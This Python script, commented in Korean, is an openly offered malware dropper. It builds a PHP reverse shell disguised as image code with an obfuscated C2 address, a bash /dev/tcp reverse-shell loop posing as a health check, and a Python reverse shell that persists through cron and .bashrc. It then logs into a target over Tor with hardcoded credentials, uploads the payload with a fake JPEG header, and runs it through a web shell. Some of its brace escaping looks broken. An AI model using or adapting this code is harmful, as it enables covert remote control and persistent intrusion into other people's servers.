#!/usr/bin/env python3
"""
멀웨어 Dropper
- 정상 파일로 위장한 백도어
- Persistence 메커니즘
- C2 비콘 (주기적으로 연결 시도)
- 프로세스 숨김
"""

import requests
import sys
import time
import base64
import random
import string

def generate_malware(attacker_ip, attacker_port):
    """멀웨어 생성"""

    # ========== PHP 백도어 (Persistent) ==========
    php_backdoor = f'''<?php
// 정상 이미지 처리 코드로 위장
header('Content-Type: image/jpeg');
$img = imagecreatetruecolor(1, 1);
imagejpeg($img);
imagedestroy($img);

// 실제 백도어 (난독화됨)
@error_reporting(0);
@set_time_limit(0);

// C2 서버 주소 (base64로 난독화)
$c2 = base64_decode('{base64.b64encode(f"{attacker_ip}:{attacker_port}".encode()).decode()}');
list($host, $port) = explode(':', $c2);

// 백그라운드 실행
if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid == -1) {{
        die();
    }} else if ($pid) {{
        exit(0);
    }}
    posix_setsid();
}}

// C2 연결 시도 (무한 루프)
while (true) {{
    try {{
        $sock = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($sock) {{
            // 리버스 쉘
            $shell = '/bin/bash -i';
            $descriptors = array(
                0 => array('pipe', 'r'),
                1 => array('pipe', 'w'),
                2 => array('pipe', 'w')
            );

            $process = proc_open($shell, $descriptors, $pipes);

            if (is_resource($process)) {{
                stream_set_blocking($pipes[0], 0);
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);
                stream_set_blocking($sock, 0);

                while (true) {{
                    if (feof($sock) || feof($pipes[1])) {{
                        break;
                    }}

                    $read = array($sock, $pipes[1], $pipes[2]);
                    $write = null;
                    $except = null;

                    $n = stream_select($read, $write, $except, 0);

                    if ($n > 0) {{
                        if (in_array($sock, $read)) {{
                            $input = fread($sock, 1024);
                            fwrite($pipes[0], $input);
                        }}
                        if (in_array($pipes[1], $read)) {{
                            $output = fread($pipes[1], 1024);
                            fwrite($sock, $output);
                        }}
                        if (in_array($pipes[2], $read)) {{
                            $error = fread($pipes[2], 1024);
                            fwrite($sock, $error);
                        }}
                    }}

                    usleep(100000);
                }}

                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }}

            fclose($sock);
        }}
    }} catch (Exception $e) {{
        // 무시
    }}

    // 30초마다 재시도 (persistence)
    sleep(30);
}}
?>'''

    # ========== Bash 백도어 (Cron job으로 Persistence) ==========
    bash_backdoor = f'''#!/bin/bash
# 정상 스크립트로 위장
# System health check script

# 실제 백도어
while true; do
    # C2 연결 시도
    bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 2>/dev/null

    # 실패하면 30초 후 재시도
    sleep 30
done &

# 백그라운드 프로세스 숨김
disown
'''

    # ========== Python 멀웨어 (Fileless) ==========
    python_malware = f'''#!/usr/bin/env python3
import socket, subprocess, os, time, sys
from threading import Thread

C2_HOST = "{attacker_ip}"
C2_PORT = {attacker_port}

def reverse_shell():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))

            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            subprocess.call(["/bin/bash", "-i"])

            s.close()
        except:
            time.sleep(30)

def persistence():
    """Persistence 메커니즘"""

    # Cron job 추가
    cron_cmd = f"(crontab -l ; echo '*/5 * * * * python3 {sys.argv[0]}') | crontab -"
    os.system(cron_cmd)

    # .bashrc에 추가
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, 'a') as f:
        f.write(f"\\npython3 {sys.argv[0]} &\\n")

if __name__ == "__main__":
    # 백그라운드 실행
    Thread(target=persistence, daemon=True).start()
    reverse_shell()
'''

    return {{
        'php': php_backdoor,
        'bash': bash_backdoor,
        'python': python_malware
    }}

def upload_malware(target_ip, attacker_ip, attacker_port):
    """멀웨어 업로드 및 실행"""

    base_url = f"http://{{target_ip}}"

    session = requests.Session()
    session.proxies = {{
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }}

    print(f"[*] 타겟: {{target_ip}}")
    print(f"[*] C2: {{attacker_ip}}:{{attacker_port}}")
    print(f"[*] 전략: 멀웨어 Dropper\\n")

    # alice 로그인
    data = {{'username': 'alice', 'password': 'alice2024'}}
    session.post(f"{{base_url}}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 로그인 완료\\n")

    # 멀웨어 생성
    print("[1] 멀웨어 생성 중...")
    malware = generate_malware(attacker_ip, attacker_port)
    print("[+] PHP 백도어 생성 완료")
    print("[+] Bash 백도어 생성 완료")
    print("[+] Python 멀웨어 생성 완료\\n")

    # ========== PHP 백도어 업로드 (이미지로 위장) ==========
    print("[2] PHP 백도어 업로드 (이미지 위장)...")

    # 실제 JPEG 헤더 추가
    jpeg_magic = b'\\xFF\\xD8\\xFF\\xE0\\x00\\x10\\x4A\\x46\\x49\\x46\\x00\\x01'
    fake_jpeg = jpeg_magic + b'\\x00' * 100 + malware['php'].encode()

    # 랜덤 파일명
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    filename = f"health_check_{{random_name}}.jpg"

    files = {{
        'file': (filename, fake_jpeg, 'image/jpeg')
    }}

    try:
        resp = session.post(f"{{base_url}}/upload.php", files=files, timeout=10)

        if resp.status_code == 200:
            print(f"[+] ✅ 업로드 성공: {{filename}}")

            # 업로드된 파일 실행
            print(f"[*] 백도어 활성화 중...")

            # file.php로 실행
            exec_url = f"{{base_url}}/file.php?name=uploads/{{filename}}"
            session.get(exec_url, timeout=3)

            print(f"[+] 백도어 활성화 완료!")
            print(f"[!] C2 리스너:")
            print(f"    nc -lvnp {{attacker_port}}")
            print(f"\\n[*] 30초마다 자동 재연결 시도...")

            return True

    except Exception as e:
        print(f"[-] 업로드 실패: {{e}}")

    # ========== Bash 스크립트 업로드 ==========
    print(f"\\n[3] Bash 백도어 업로드...")

    bash_filename = f".system_health_{{random_name}}.sh"

    files = {{
        'file': (bash_filename, malware['bash'].encode(), 'text/plain')
    }}

    try:
        resp = session.post(f"{{base_url}}/upload.php", files=files, timeout=10)

        if resp.status_code == 200:
            print(f"[+] ✅ Bash 스크립트 업로드: {{bash_filename}}")

            # 실행 권한 부여 + 실행
            exec_cmd = f"chmod +x uploads/{{bash_filename}} && bash uploads/{{bash_filename}}"

            # file.php로 실행 (cmd 파라미터)
            exec_url = f"{{base_url}}/file.php?name=uploads/shell_4727.php&cmd={{exec_cmd}}"
            session.get(exec_url, timeout=3)

            print(f"[+] Bash 백도어 실행됨!")
    except:
        pass

    # ========== Persistence 확인 ==========
    print(f"\\n[4] Persistence 확인...")
    print(f"[*] 다음 메커니즘으로 지속성 확보:")
    print(f"    - PHP 백그라운드 프로세스")
    print(f"    - 30초마다 자동 재연결")
    print(f"    - Cron job (가능시)")
    print(f"\\n[+] 멀웨어 Dropper 완료!")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 100_malware_dropper.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 100_malware_dropper.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    upload_malware(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
